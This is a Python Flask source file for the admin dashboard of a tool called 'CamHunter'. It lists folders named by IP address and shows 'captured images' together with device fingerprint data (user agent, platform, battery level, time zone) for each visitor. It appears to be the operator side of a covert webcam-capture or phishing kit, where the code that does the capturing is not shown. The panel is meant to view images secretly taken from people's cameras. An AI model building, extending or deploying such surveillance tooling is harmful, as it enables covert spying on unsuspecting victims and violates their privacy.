
import os
import json
from flask import Flask, render_template_string, jsonify, send_from_directory

admin_app = Flask(__name__)

UPLOAD_FOLDER = 'data' 
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

@admin_app.route('/data/<path:filename>')
def serve_data(filename):
    return send_from_directory(UPLOAD_FOLDER, filename)

@admin_app.route('/api/folders')
def list_folders():
    try:
        folders = [d for d in os.listdir(UPLOAD_FOLDER) if os.path.isdir(os.path.join(UPLOAD_FOLDER, d))]
        folders.sort(key=lambda f: os.path.getmtime(os.path.join(UPLOAD_FOLDER, f)), reverse=True)
        return jsonify({"folders": folders})
    except Exception as e:
        return jsonify({"error": "Failed to list folders."}), 500

@admin_app.route('/api/folder_content/<ip_folder>')
def get_folder_content(ip_folder):
    folder_path = os.path.join(UPLOAD_FOLDER, ip_folder)
    if not os.path.isdir(folder_path):
        return jsonify({"error": "Folder not found"}), 404

    images = []
    info_content = None

    try:
        for filename in os.listdir(folder_path):
            file_path = os.path.join(folder_path, filename)
            if os.path.isfile(file_path):
                if filename.lower().endswith(('.png', '.jpg', '.jpeg', '.gif')):
                    images.append(f'/data/{ip_folder}/{filename}')
                elif filename.lower() == 'info.txt':
                    with open(file_path, 'r', encoding='utf-8') as f:
                        try:
                            info_content = json.load(f) 
                        except json.JSONDecodeError:
                            info_content = f.read() 
    except Exception as e:
        return jsonify({"error": "Failed to retrieve folder content."}), 500
    
    images.sort()

    return jsonify({"images": images, "info": info_content})


ADMIN_HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CamHunter - Admin Dashboard</title>
    
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
    
    <style>
        body {
            background: linear-gradient(180deg, #0a0a0a, #1a1a1a, #0a0a0a);
            background-size: 100% 200%;
            animation: subtleGradient 10s ease infinite alternate;
            color: #e0e0e0;
            font-family: 'Poppins', sans-serif;
            overflow-x: hidden;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: #222; }
        ::-webkit-scrollbar-thumb { background: #00ff8c; border-radius: 4px; }
        ::-webkit-scrollbar-thumb:hover { background: #00e67e; }

        .admin-header {
            background-color: rgba(30, 30, 30, 0.8);
            backdrop-filter: blur(10px);
            border-bottom: 1px solid rgba(0, 255, 140, 0.2);
            padding: 15px 20px;
            text-align: center;
            box-shadow: 0 5px 20px rgba(0, 255, 140, 0.15);
            margin-bottom: 20px; /* Space between header and wrapper */
        }
        .admin-header h1 {
            color: #00ff8c;
            font-weight: 700;
            font-size: 2.5rem;
            text-shadow: 0 0 15px rgba(0, 255, 140, 0.7), 0 0 25px rgba(0, 255, 140, 0.5);
            animation: glow 1.5s ease-in-out infinite alternate;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        .admin-header h1 i {
            font-size: 2.5rem; /* Icon size matches text */
            color: #00ff8c;
            text-shadow: 0 0 10px rgba(0, 255, 140, 0.7);
        }
        @keyframes glow {
            from { text-shadow: 0 0 10px rgba(0, 255, 140, 0.7), 0 0 20px rgba(0, 255, 140, 0.5); }
            to { text-shadow: 0 0 15px rgba(0, 255, 140, 1), 0 0 30px rgba(0, 255, 140, 0.8); }
        }

        .wrapper {
            display: flex;
            flex: 1;
            padding: 0 20px 20px 20px; /* Adjusted padding due to header */
            gap: 20px;
        }

        .sidebar {
            flex: 0 0 280px; /* Fixed width */
            background-color: rgba(30, 30, 30, 0.8);
            backdrop-filter: blur(10px);
            border-radius: 1rem;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 0 20px rgba(0, 255, 140, 0.1);
            padding: 20px;
            overflow-y: auto;
            max-height: calc(100vh - 120px); /* Adjust for header and wrapper padding */
        }
        .sidebar-heading {
            color: #00ff8c;
            font-weight: 700;
            text-shadow: 0 0 10px rgba(0, 255, 140, 0.5);
            margin-bottom: 20px;
            text-align: center;
        }
        .folder-item {
            padding: 10px 15px;
            margin-bottom: 8px;
            background-color: rgba(40, 40, 40, 0.6);
            border-radius: 0.5rem;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: space-between;
            border: 1px solid transparent;
        }
        .folder-item:hover {
            background-color: rgba(0, 255, 140, 0.1);
            border-color: #00ff8c;
            transform: translateX(5px);
        }
        .folder-item.active {
            background-color: #00ff8c;
            color: #111;
            font-weight: 600;
            border-color: #00e67e;
            box-shadow: 0 0 15px rgba(0, 255, 140, 0.5);
        }
        .folder-item.active i {
            color: #111;
        }
        .folder-item i {
            margin-right: 10px;
            color: #00ff8c;
        }

        .content-area {
            flex: 1;
            background-color: rgba(30, 30, 30, 0.8);
            backdrop-filter: blur(10px);
            border-radius: 1rem;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 0 20px rgba(0, 255, 140, 0.1);
            padding: 20px;
            overflow-y: auto;
            max-height: calc(100vh - 120px); /* Adjusted for header and wrapper padding */
        }
        .content-heading {
            color: #00ff8c;
            font-weight: 700;
            text-shadow: 0 0 10px rgba(0, 255, 140, 0.5);
            margin-bottom: 20px;
        }
        
        .info-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
            gap: 15px;
            margin-bottom: 30px;
        }
        .info-item-card {
            background-color: rgba(40, 40, 40, 0.6);
            border-radius: 0.75rem;
            padding: 15px;
            border: 1px solid rgba(0, 255, 140, 0.2);
            display: flex;
            align-items: center;
            gap: 15px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
            transition: transform 0.2s ease;
        }
        .info-item-card:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 20px rgba(0,0,0,0.5), 0 0 25px rgba(0, 255, 140, 0.2);
        }
        .info-item-card i {
            font-size: 2.5rem;
            color: #00ff8c;
        }
        .info-item-card .info-text-content {
            flex-grow: 1; 
            min-width: 0; 
        }
        .info-item-card .info-label {
            font-size: 0.9rem;
            color: #bbb;
            margin-bottom: 2px;
        }
        .info-item-card .info-value {
            font-size: 1.1rem;
            font-weight: 600;
            color: #fff;
            white-space: nowrap; 
            overflow: hidden;
            text-overflow: ellipsis;
        }
        .info-item-card .info-value.wrap { 
            white-space: normal;
            word-break: break-all; 
            overflow: visible;
            text-overflow: unset;
        }
        .info-item-card .info-value.small {
            font-size: 0.9rem;
        }


        .image-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
            gap: 15px;
        }
        .image-thumbnail {
            width: 100%;
            height: 150px;
            object-fit: cover;
            border-radius: 0.75rem;
            border: 2px solid rgba(0, 255, 140, 0.3);
            cursor: zoom-in;
            transition: transform 0.2s ease, box-shadow 0.2s ease;
            box-shadow: 0 0 10px rgba(0, 255, 140, 0.1);
        }
        .image-thumbnail:hover {
            transform: scale(1.03);
            box-shadow: 0 0 20px rgba(0, 255, 140, 0.5);
        }

        .spinner-border {
            color: #00ff8c;
            width: 3rem;
            height: 3rem;
        }
        .loading-text {
            color: #00ff8c;
        }

        .image-modal {
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0, 0, 0, 0.9);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.3s ease, visibility 0.3s ease;
        }
        .image-modal.show {
            opacity: 1;
            visibility: visible;
        }
        .image-modal-content-wrapper {
            position: relative;
            max-width: 90%;
            max-height: 90%;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column; /* To stack image and counter */
        }
        .image-modal-content {
            max-width: 100%;
            max-height: 100%;
            object-fit: contain;
            border-radius: 1rem;
            box-shadow: 0 0 50px rgba(0, 255, 140, 0.7);
            border: 3px solid #00ff8c;
        }
        .image-modal-close {
            position: absolute;
            top: 20px;
            right: 30px;
            font-size: 2.5rem;
            color: #00ff8c;
            cursor: pointer;
            z-index: 1001;
            transition: transform 0.2s ease, color 0.2s ease;
        }
        .image-modal-close:hover {
            transform: rotate(90deg);
            color: #fff;
        }

        .image-modal-nav {
            position: absolute;
            top: 50%;
            transform: translateY(-50%);
            display: flex;
            width: 100%;
            justify-content: space-between;
            padding: 0 10px;
            box-sizing: border-box; 
        }
        .image-modal-nav button {
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(0, 255, 140, 0.5);
            color: #00ff8c;
            font-size: 2rem;
            padding: 5px 15px;
            cursor: pointer;
            border-radius: 50%;
            transition: background-color 0.3s ease, color 0.3s ease, transform 0.2s ease;
            outline: none;
            display: flex;
            align-items: center;
            justify-content: center;
            width: 50px;
            height: 50px;
            opacity: 0.8;
            box-shadow: 0 0 15px rgba(0, 255, 140, 0.3);
        }
        .image-modal-nav button:hover {
            background: #00ff8c;
            color: #111;
            transform: scale(1.1);
            opacity: 1;
        }
        .image-modal-nav button:disabled {
            opacity: 0.3;
            cursor: not-allowed;
            background: rgba(0, 0, 0, 0.3);
            color: #555;
            box-shadow: none;
            transform: none;
        }

        .image-counter {
            color: #00ff8c;
            font-size: 1.2rem;
            margin-top: 10px;
            text-shadow: 0 0 10px rgba(0, 255, 140, 0.5);
            font-weight: 600;
        }

        @keyframes subtleGradient {
            0% { background-position: 0% 0%; }
            100% { background-position: 0% 100%; }
        }
        
        @media (max-width: 992px) {
            .admin-header h1 {
                font-size: 2rem;
            }
            .admin-header h1 i {
                font-size: 2rem;
            }
            .wrapper {
                flex-direction: column;
                padding: 0 10px 10px 10px; /* Adjusted padding for smaller screens */
            }
            .sidebar {
                flex: none;
                width: 100%;
                max-height: 300px; /* Limit height on smaller screens */
                margin-bottom: 20px;
            }
            .content-area {
                flex: none;
                width: 100%;
                max-height: none; /* Allow full height */
            }
            .image-modal-nav {
                top: auto;
                bottom: 20px;
                transform: none;
                justify-content: center;
                gap: 20px;
            }
            .image-modal-nav button {
                font-size: 1.5rem;
                width: 40px;
                height: 40px;
            }
            .image-modal-close {
                top: 10px;
                right: 15px;
                font-size: 2rem;
            }
        }
        @media (max-width: 768px) {
            .info-grid {
                grid-template-columns: repeat(auto-fill, minmax(240px, 1fr));
            }
        }
        @media (max-width: 576px) {
            .info-grid {
                grid-template-columns: 1fr; /* Stack on very small screens */
            }
            .wrapper {
                padding: 0 10px 10px 10px;
            }
            .sidebar, .content-area {
                padding: 15px;
            }
        }
    </style>
</head>
<body>
    <div class="admin-header">
        <h1>
            <i class="bi bi-eye-fill"></i> CamHunter
            </h1>
    </div>

    <div class="wrapper">
        <div class="sidebar" id="sidebar">
            <h2 class="sidebar-heading">IP Folders</h2>
            <div id="folder-list">
                <div class="d-flex justify-content-center align-items-center flex-column py-5">
                    <div class="spinner-border" role="status"></div>
                    <p class="mt-3 loading-text">Loading folders...</p>
                </div>
            </div>
        </div>

        <div class="content-area" id="content-area">
            <h2 class="content-heading" id="content-heading">Select a Folder to View Content</h2>
            <div id="content-display">
                <div class="d-flex justify-content-center align-items-center flex-column py-5">
                    <i class="bi bi-folder-fill" style="font-size: 5rem; color: #00ff8c;"></i>
                    <p class="mt-3 text-white-50">No folder selected.</p>
                </div>
            </div>
        </div>
    </div>

    <div id="image-modal" class="image-modal">
        <span class="image-modal-close" id="modal-close-btn">&times;</span>
        <div class="image-modal-content-wrapper">
            <img class="image-modal-content" id="modal-image" src="" alt="Full size image">
            <div class="image-modal-nav">
                <button id="prev-image-btn"><i class="bi bi-chevron-left"></i></button>
                <button id="next-image-btn"><i class="bi bi-chevron-right"></i></button>
            </div>
            <span class="image-counter" id="image-counter"></span>
        </div>
    </div>
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js"></script>
    
    <script>
        const folderListElem = document.getElementById('folder-list');
        const contentAreaElem = document.getElementById('content-area');
        const contentHeadingElem = document.getElementById('content-heading');
        const contentDisplayElem = document.getElementById('content-display');
        const imageModal = document.getElementById('image-modal');
        const modalImage = document.getElementById('modal-image');
        const modalCloseBtn = document.getElementById('modal-close-btn');
        const prevImageBtn = document.getElementById('prev-image-btn');
        const nextImageBtn = document.getElementById('next-image-btn');
        const imageCounter = document.getElementById('image-counter');

        let activeFolder = null;
        let currentImages = [];
        let currentImageIndex = 0;

        async function fetchFolders() {
            try {
                const response = await fetch('/api/folders');
                const data = await response.json();
                if (data.error) {
                    folderListElem.innerHTML = `<p class="text-danger text-center">${data.error}</p>`;
                    return;
                }
                
                folderListElem.innerHTML = ''; 
                if (data.folders.length === 0) {
                    folderListElem.innerHTML = `<p class="text-white-50 text-center mt-3">No data folders found yet.</p>`;
                    return;
                }

                data.folders.forEach(folder => {
                    const folderItem = document.createElement('div');
                    folderItem.className = 'folder-item';
                    folderItem.innerHTML = `<i class="bi bi-folder-fill"></i><span>${folder}</span><i class="bi bi-chevron-right"></i>`;
                    folderItem.dataset.folder = folder;
                    folderItem.addEventListener('click', () => selectFolder(folder));
                    folderListElem.appendChild(folderItem);
                    gsap.from(folderItem, { opacity: 0, x: -20, duration: 0.3, stagger: 0.05 });
                });

            } catch (error) {
                folderListElem.innerHTML = `<p class="text-danger text-center">Error loading folders.</p>`;
            }
        }

        async function selectFolder(folderName) {
            if (activeFolder === folderName) return; 

            // Update active state in sidebar
            if (activeFolder) {
                const prevActive = document.querySelector(`.folder-item[data-folder="${activeFolder}"]`);
                if (prevActive) prevActive.classList.remove('active');
            }
            const currentActive = document.querySelector(`.folder-item[data-folder="${folderName}"]`);
            if (currentActive) currentActive.classList.add('active');
            activeFolder = folderName;

            contentHeadingElem.textContent = `Content for: ${folderName}`;
            contentDisplayElem.innerHTML = `
                <div class="d-flex justify-content-center align-items-center flex-column py-5">
                    <div class="spinner-border" role="status"></div>
                    <p class="mt-3 loading-text">Loading content...</p>
                </div>
            `;
            gsap.fromTo(contentDisplayElem, { opacity: 0, y: 20 }, { opacity: 1, y: 0, duration: 0.5 });


            try {
                const response = await fetch(`/api/folder_content/${folderName}`);
                const data = await response.json();

                if (data.error) {
                    contentDisplayElem.innerHTML = `<p class="text-danger text-center">${data.error}</p>`;
                    return;
                }

                let contentHtml = '';
                currentImages = data.images || []; 

                if (data.info) {
                    contentHtml += `
                        <h5 class="text-light mb-3"><i class="bi bi-info-circle-fill me-2"></i>Device Information</h5>
                        <div class="info-grid">
                    `;
                    const info = data.info;
                    
                    if (info.timestamp) contentHtml += createInfoCard('clock', 'Timestamp', new Date(info.timestamp).toLocaleString());
                    if (info.deviceType) contentHtml += createInfoCard(getDeviceTypeIcon(info.deviceType), 'Device Type', info.deviceType);
                    if (info.screenResolution) contentHtml += createInfoCard('display', 'Screen Resolution', info.screenResolution);
                    if (info.platform) contentHtml += createInfoCard('cpu', 'Platform', info.platform);
                    if (info.language) contentHtml += createInfoCard('globe', 'Language', info.language);
                    if (info.userAgent) contentHtml += createInfoCard('file-earmark-text', 'User Agent', info.userAgent, true, true); 
                    if (info.deviceMemory && info.deviceMemory !== 'N/A') contentHtml += createInfoCard('memory', 'Device Memory', `${info.deviceMemory} GB`);
                    if (info.timeZone) contentHtml += createInfoCard('clock-history', 'Time Zone', info.timeZone);
                    if (info.battery && info.battery.status !== "Not Supported") {
                        const batteryIcon = info.battery.charging ? 'battery-charging' : 'battery-half';
                        const batteryValue = `Level: ${info.battery.level} ${info.battery.charging ? '(Charging)' : ''}`;
                        contentHtml += createInfoCard(batteryIcon, 'Battery Status', batteryValue);
                    }
                    
                    contentHtml += `</div>`;
                } else {
                    contentHtml += `<p class="text-white-50">No detailed device info found for this folder.</p>`;
                }

                if (currentImages.length > 0) {
                    contentHtml += `
                        <h5 class="text-light mb-3"><i class="bi bi-image-fill me-2"></i>Captured Images (${currentImages.length})</h5>
                        <div class="image-grid">
                    `;
                    currentImages.forEach((imageUrl, index) => {
                        contentHtml += `<img src="${imageUrl}" class="image-thumbnail" alt="Captured Image ${index + 1}" data-index="${index}">`;
                    });
                    contentHtml += `</div>`;
                } else {
                    contentHtml += `<p class="text-white-50">No images found for this folder.</p>`;
                }

                contentDisplayElem.innerHTML = contentHtml;
                gsap.from(contentDisplayElem.children, { opacity: 0, y: 20, duration: 0.5, stagger: 0.1 });

                document.querySelectorAll('.image-thumbnail').forEach(img => {
                    img.addEventListener('click', (e) => {
                        const index = parseInt(e.target.dataset.index);
                        openImageModal(index);
                    });
                });

            } catch (error) {
                contentDisplayElem.innerHTML = `<p class="text-danger text-center">Error loading content.</p>`;
            }
        }

        function createInfoCard(iconName, label, value, isSmall = false, shouldWrap = false) {
            const valueClass = `info-value ${isSmall ? 'small' : ''} ${shouldWrap ? 'wrap' : ''}`;
            return `
                <div class="info-item-card">
                    <i class="bi bi-${iconName.toLowerCase()}"></i>
                    <div class="info-text-content">
                        <div class="info-label">${label}</div>
                        <div class="${valueClass}">${value}</div>
                    </div>
                </div>
            `;
        }

        function getDeviceTypeIcon(deviceType) {
            switch(deviceType.toLowerCase()) {
                case 'mobile': return 'phone'; 
                case 'tablet': return 'tablet-landscape'; 
                case 'desktop': return 'laptop'; 
                default: return 'question-circle'; 
            }
        }

        function openImageModal(startIndex) {
            currentImageIndex = startIndex;
            updateModalImage();
            imageModal.classList.add('show');
            gsap.fromTo(imageModal, { opacity: 0 }, { opacity: 1, duration: 0.3 });
            addKeyboardNavigation();
        }

        function closeImageModal() {
            gsap.to(imageModal, { opacity: 0, duration: 0.3, onComplete: () => imageModal.classList.remove('show') });
            removeKeyboardNavigation();
        }

        function updateModalImage() {
            if (currentImages.length === 0) {
                modalImage.src = '';
                imageCounter.textContent = '';
                prevImageBtn.disabled = true;
                nextImageBtn.disabled = true;
                return;
            }

            gsap.to(modalImage, {
                opacity: 0,
                scale: 0.9,
                duration: 0.2,
                onComplete: () => {
                    modalImage.src = currentImages[currentImageIndex];
                    imageCounter.textContent = `${currentImageIndex + 1} / ${currentImages.length}`;
                    prevImageBtn.disabled = currentImageIndex === 0;
                    nextImageBtn.disabled = currentImageIndex === currentImages.length - 1;
                    gsap.fromTo(modalImage, { opacity: 0, scale: 0.9 }, { opacity: 1, scale: 1, duration: 0.3, ease: "power2.out" });
                }
            });
        }

        function nextImage() {
            if (currentImageIndex < currentImages.length - 1) {
                currentImageIndex++;
                updateModalImage();
            }
        }

        function prevImage() {
            if (currentImageIndex > 0) {
                currentImageIndex--;
                updateModalImage();
            }
        }

        function handleKeyboard(event) {
            if (imageModal.classList.contains('show')) {
                if (event.key === 'ArrowLeft') {
                    prevImage();
                } else if (event.key === 'ArrowRight') {
                    nextImage();
                } else if (event.key === 'Escape') {
                    closeImageModal();
                }
            }
        }

        function addKeyboardNavigation() {
            document.addEventListener('keydown', handleKeyboard);
        }

        function removeKeyboardNavigation() {
            document.removeEventListener('keydown', handleKeyboard);
        }


        modalCloseBtn.addEventListener('click', closeImageModal);
        prevImageBtn.addEventListener('click', prevImage);
        nextImageBtn.addEventListener('click', nextImage);
        imageModal.addEventListener('click', (e) => {
            if (e.target === imageModal || e.target === modalCloseBtn) {
                closeImageModal();
            }
        });


        fetchFolders();

    </script>
</body>
</html>
"""

@admin_app.route('/')
def admin_index():
    return render_template_string(ADMIN_HTML_TEMPLATE)

if __name__ == '__main__':
    admin_app.run(host='0.0.0.0', port=5001, debug=False)